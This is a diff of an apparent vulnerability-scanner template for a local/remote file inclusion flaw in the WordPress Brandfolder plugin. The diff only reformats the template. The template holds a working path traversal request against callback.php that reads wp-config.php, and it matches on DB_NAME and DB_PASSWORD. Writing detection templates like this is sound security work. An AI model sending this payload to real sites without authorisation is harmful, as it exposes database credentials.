@@ -1,5 +1,4 @@
 id: brandfolder-lfi
-
 info:
   name: Wordpress Brandfolder - Remote/Local File Inclusion
   author: 0x_Akoko
@@ -11,26 +10,22 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-22
+    cwe-id: CWE-22,CWE-23
   metadata:
     max-request: 1
-  tags: lfi,rfi,edb,wordpress,wp-plugin,vuln
-
+  tags: edb,lfi,rfi,vuln,wordpress,wp-plugin
 http:
-  - method: GET
+  - matchers:
+      - condition: and
+        part: body
+        type: word
+        words:
+          - DB_NAME
+          - DB_PASSWORD
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00'
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - "DB_NAME"
-          - "DB_PASSWORD"
-        part: body
-        condition: and
-
-      - type: status
-        status:
-          - 200
-
